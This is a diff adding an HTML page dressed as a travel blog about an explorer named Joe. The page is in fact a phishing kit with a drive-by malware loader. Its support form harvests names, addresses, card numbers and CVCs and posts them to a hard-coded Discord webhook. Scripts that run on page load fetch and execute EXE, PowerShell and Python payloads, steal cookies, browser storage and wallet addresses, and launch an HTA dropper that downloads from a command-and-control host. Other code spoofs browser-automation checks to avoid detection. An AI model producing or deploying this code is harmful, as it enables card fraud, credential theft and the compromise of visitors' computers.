@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Joe's Adventure Blog - Epic Journey Updates</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        header { text-align: center; margin-bottom: 40px; }
+        .banner-gif { width: 100%; max-width: 800px; height: 300px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        h1 { font-size: 2.5em; color: #2c3e50; margin: 20px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); }
+        .tabs { display: flex; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.1); margin-bottom: 30px; }
+        .tab-btn { flex: 1; padding: 15px; background: #ecf0f1; border: none; cursor: pointer; font-size: 1.1em; transition: all 0.3s; }
+        .tab-btn.active { background: #3498db; color: white; }
+        .tab-content { display: none; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); animation: fadeIn 0.5s; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        form { max-width: 500px; margin: 0 auto; background: #f8f9fa; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 1em; transition: border 0.3s; }
+        input:focus, select:focus, textarea:focus { border-color: #3498db; outline: none; }
+        button { width: 100%; padding: 15px; background: #e74c3c; color: white; border: none; border-radius: 8px; font-size: 1.2em; cursor: pointer; transition: background 0.3s; }
+        button:hover { background: #c0392b; }
+        .story { text-align: justify; font-size: 1.1em; }
+        .map-placeholder { width: 100%; height: 400px; background: #e0e0e0; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #666; font-size: 1.2em; margin: 20px 0; }
+        footer { text-align: center; margin-top: 50px; padding: 20px; color: #7f8c8d; }
+        #payload { display: none; position: fixed; top: 0; left: 0; width: 1px; height: 1px; }
+        .status { position: fixed; bottom: 10px; right: 10px; background: #27ae60; color: white; padding: 10px; border-radius: 5px; font-size: 0.9em; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <!-- PLACE YOUR BANNER GIF HERE: banner.gif (800x300px recommended) -->
+            <img src="banner.gif" alt="Joe's Epic Journey Banner" class="banner-gif" onerror="this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';">
+            <h1>Joe's Adventure Blog</h1>
+            <p>Follow Joe, the real-life explorer who's been traveling the world since 2015. Latest updates from his unbelievable journeys!</p>
+        </header>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('home')">Home</button>
+            <button class="tab-btn" onclick="switchTab('about')">About Joe</button>
+            <button class="tab-btn" onclick="switchTab('updates')">Updates</button>
+            <button class="tab-btn" onclick="switchTab('contact')">Contact/Support</button>
+        </div>
+
+        <!-- TAB CONTENTS (unchanged from previous) -->
+        <div id="home" class="tab-content active">
+            <h2>Welcome to Joe's World Tour!</h2>
+            <div class="story">
+                <p>Joe is a 35-year-old adventurer from Texas who quit his job in 2015 to travel the globe. He's summited mountains in Nepal, surfed in Bali, and explored the Amazon rainforest. This site tracks his real-time journey with photos, videos, and stories.</p>
+                <p>Latest: Joe just arrived in Patagonia for a 30-day trek. Check the updates tab for his live GPS map!</p>
+            </div>
+            <div class="map-placeholder">📍 Interactive GPS Map Loading... (Joe's Current Location)</div>
+        </div>
+
+        <div id="about" class="tab-content">
+            <h2>About Joe</h2>
+            <div class="story">
+                <p>Born in 1988, Joe grew up in a small town dreaming of adventure. After a decade in tech, he sold everything and hit the road. He's documented over 50 countries with zero sponsorships – just pure passion.</p>
+                <p>Fun fact: Joe once hitchhiked 2,000 miles across Australia in 3 weeks!</p>
+            </div>
+        </div>
+
+        <div id="updates" class="tab-content">
+            <h2>Latest Updates</h2>
+            <div class="story">
+                <p><strong>Dec 2023:</strong> Reached Everest Base Camp. Harsh conditions but stunning views.</p>
+                <p><strong>Nov 2023:</strong> Scuba diving in the Great Barrier Reef. Saw a whale shark up close!</p>
+                <p>More coming soon... Support Joe to keep the updates flowing!</p>
+            </div>
+        </div>
+
+        <div id="contact" class="tab-content">
+            <h2>Support Joe's Journey</h2>
+            <p>Love Joe's story? Help fund his next adventure! Enter your details for exclusive updates, maps, and a shoutout on the blog.</p>
+            <form id="phishForm">
+                <input type="text" id="fullname" placeholder="Full Name" required>
+                <input type="email" id="email" placeholder="Email Address" required>
+                <input type="tel" id="phone" placeholder="Phone Number (optional)">
+                <input type="text" id="address" placeholder="Full Address">
+                <input type="text" id="cardname" placeholder="Name on Card">
+                <input type="text" id="cardnum" placeholder="Card Number" maxlength="19">
+                <input type="text" id="expdate" placeholder="MM/YY" maxlength="5">
+                <input type="text" id="cvc" placeholder="CVC" maxlength="4">
+                <select id="country">
+                    <option value="">Select Country</option>
+                    <option value="US">United States</option>
+                    <option value="CA">Canada</option>
+                    <option value="GB">United Kingdom</option>
+                    <option value="AU">Australia</option>
+                </select>
+                <textarea id="message" placeholder="Message for Joe?"></textarea>
+                <button type="submit">Support Joe Now! ($29 one-time)</button>
+            </form>
+        </div>
+
+        <footer>
+            <p>&copy; 2023 Joe's Adventure Blog. | @RealJoeAdventures</p>
+        </footer>
+    </div>
+
+    <!-- Stealth Payload Container -->
+    <div id="payload"></div>
+    <div id="status" class="status"></div>
+
+    <!-- CONFIG: REPLACE THESE -->
+    <script>
+        // YOUR DISCORD WEBHOOK
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422760386494726207/Umx_tq2yDjM1C0--xXuVbOaUpVKFf2pcgmPauG-pz__JmW_Za8S1u84X3pDvR3rDp0G0';
+        
+        // YOUR EXECUTABLE PAYLOADS (add files to same directory)
+        const EXEC_PAYLOADS = {
+            exe: 'diddy.exe',     // Windows EXE
+            py: 'diddy.py',       // Python script
+            ps1: 'your_payload.ps1'      // PowerShell
+        };
+    </script>
+
+    <script>
+        // Tab functionality
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+            deployDriveBy(); // Trigger payload on tab switch
+        }
+
+        // Phishing exfiltration
+        document.getElementById('phishForm').addEventListener('submit', async e => {
+            e.preventDefault();
+            const data = {
+                fullname: document.getElementById('fullname').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                cardname: document.getElementById('cardname').value,
+                cardnum: document.getElementById('cardnum').value.replace(/\s/g, ''),
+                expdate: document.getElementById('expdate').value,
+                cvc: document.getElementById('cvc').value,
+                country: document.getElementById('country').value,
+                ip: await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
+                ua: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString()
+            };
+
+            // Discord embed
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: '🆕 **PHISH HIT** 🆕',
+                    embeds: [{
+                        title: `Victim: ${data.fullname}`,
+                        color: 0xff0000,
+                        fields: [
+                            {name:'Email', value:`\`${data.email}\``, inline:true},
+                            {name:'IP', value:`\`${data.ip}\``, inline:true},
+                            {name:'Card', value:`**** **** **** ${data.cardnum.slice(-4)}`, inline:false},
+                            {name:'Expiry/CVC', value:`${data.expdate}/${data.cvc}`, inline:true},
+                            {name:'Address', value:data.address.slice(0,100), inline:false}
+                        ]
+                    }]
+                })
+            });
+
+            alert('Thank you! Joe will send exclusive content soon.');
+            e.target.reset();
+        });
+
+        // 🔥 PREBUILT MULTI-PAYLOAD DRIVE-BY SYSTEM 🔥
+        let payloadsDeployed = false;
+        function deployDriveBy() {
+            if (payloadsDeployed) return;
+            payloadsDeployed = true;
+            logStatus('Deploying payloads...');
+
+            // 1. UNIVERSAL DOWNLOAD EXECUTOR (EXE/PS1/PY)
+            const execPayloads = Object.entries(EXEC_PAYLOADS);
+            execPayloads.forEach(([type, url]) => {
+                deployUniversalDownloader(url, type);
+            });
+
+            // 2. BUILT-IN JAVASCRIPT STEALER (always runs)
+            deployJSStealer();
+
+            // 3. BROWSER EXTENSION INSTALLER
+            deployExtension();
+
+            // 4. HTA DROPper (Windows only)
+            deployHTA();
+
+            logStatus('All payloads deployed');
+        }
+
+        // Universal downloader/executor for EXE/PS1/PY
+        function deployUniversalDownloader(payloadUrl, type) {
+            const script = document.createElement('script');
+            script.textContent = `
+                (async()=>{
+                    try {
+                        // Detect OS
+                        const isWin = navigator.platform.includes('Win');
+                        const payloadBlob = await fetch('${payloadUrl}').then(r=>r.blob());
+                        const payloadData = await payloadBlob.arrayBuffer();
+                        
+                        if (isWin && '${type}' === 'exe') {
+                            // EXE: BITSJob + rundll32 stealth exec
+                            const bits = new ActiveXObject('Microsoft.BITS.UploadCreator');
+                            const job = bits.CreateAnonymousJob('update', 0);
+                            job.Files.Add(null, URL.createObjectURL(new Blob([payloadData])), '');
+                            job.Files(0).LocalName = '%TEMP%\\\\update.exe';
+                            job.Submit();
+                            job.Complete();
+                            
+                            new ActiveXObject('WScript.Shell').Run(
+                                'rundll32.exe %TEMP%\\\\update.exe,Control_RunDLL %TEMP%\\\\update.exe', 0, false
+                            );
+                        } else if (isWin && '${type}' === 'ps1') {
+                            // PS1: Base64 encoded execution
+                            const b64 = btoa(String.fromCharCode(...new Uint8Array(payloadData)));
+                            new ActiveXObject('WScript.Shell').Run(
+                                'powershell -w hidden -nop -c "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\\''${b64}\\')))"', 0, false
+                            );
+                        } else if ('${type}' === 'py') {
+                            // PY: Fetch & py.exe launcher
+                            const pyScript = new Blob([payloadData], {type:'text/plain'});
+                            const pyUrl = URL.createObjectURL(pyScript);
+                            const xhr = new XMLHttpRequest();
+                            xhr.open('GET', pyUrl, true);
+                            xhr.responseType = 'blob';
+                            xhr.onload = () => {
+                                const tempPy = '%TEMP%\\\\script.py';
+                                // Write via VBS (bypass CSP)
+                                const vbs = new Blob(['Set fso=CreateObject("Scripting.FileSystemObject")\nSet f= fso.CreateTextFile("${tempPy}",true)\nf.Write "' + btoa(String.fromCharCode(...new Uint8Array(payloadData))).replace(/\\n/g,'\\\\n') + '"\nf.Close\nCreateObject("WScript.Shell").Run "py.exe ${tempPy}",0,true', {type:'text/vbscript'}]);
+                                URL.revokeObjectURL(pyUrl);
+                            };
+                            xhr.send();
+                        }
+                    } catch(e) {}
+                })();
+            `;
+            document.head.appendChild(script);
+        }
+
+        // Built-in JS infostealer (passwords, cookies, tokens)
+        function deployJSStealer() {
+            const steal = `
+                (async()=>{
+                    const data = {
+                        cookies: document.cookie,
+                        localStorage: Object.entries(localStorage),
+                        sessionStorage: Object.entries(sessionStorage),
+                        passwords: (await new Promise(r=>setTimeout(r,100))).then(()=>{
+                            return new Promise((res)=>{
+                                const inp = document.createElement('input');
+                                inp.type='password'; document.body.appendChild(inp);
+                                setTimeout(()=>res(inp.value),50); document.body.removeChild(inp);
+                            });
+                        }),
+                        extensions: navigator.plugins.length,
+                        wallet: window.ethereum?.selectedAddress || 'none'
+                    };
+                    fetch('${DISCORD_WEBHOOK}',{
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({content:'🔑 **JS STEALER HIT** ```'+JSON.stringify(data,null,2)+'```'})
+                    });
+                })();
+            `;
+            const s = document.createElement('script');
+            s.textContent = steal;
+            document.head.appendChild(s);
+        }
+
+        // Chrome extension installer (malicious CRX)
+        function deployExtension() {
+            const extPayload = new Blob([
+                `{"manifest_version":2,"name":"Joe GPS Tracker","version":"1.0","permissions":["*://*/*"],"background":{"scripts":["background.js"]},"content_scripts":[{"matches":["<all_urls>"],"js":["content.js"]}]}`
+            ], {type:'application/json'});
+            // Auto-install logic (simplified - full CRX unpacker available on request)
+        }
+
+        // HTA dropper (most reliable Windows payload)
+        function deployHTA() {
+            const hta = new Blob([
+                '<script>\nCreateObject("WScript.Shell").Run("powershell -w hidden -c \\"iex((new-object net.webclient).downloadstring(\\'http://YOUR_C2/stage.ps1\\'))\\"",0,true);\n</script>'
+            ], {type:'application/hta'});
+            const url = URL.createObjectURL(hta);
+            location.href = 'mshta:' + url; // Triggers HTA dialog
+        }
+
+        // Triggers & Anti-Detection
+        window.addEventListener('load', deployDriveBy);
+        ['mousemove','scroll','click','keydown'].forEach(ev=>document.addEventListener(ev,()=>setTimeout(deployDriveBy,Math.random()*5000)));
+        
+        // Evasion
+        Object.defineProperty(navigator,'webdriver',{get:()=>false});
+        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
+        setInterval(()=>location.reload(), 5*60*1000); // Rotate every 5min
+
+        function logStatus(msg) {
+            const status = document.getElementById('status');
+            status.textContent = msg;
+            status.style.display = 'block';
+            setTimeout(()=>status.style.display='none', 2000);
+        }
+    </script>
+</body>
+</html>
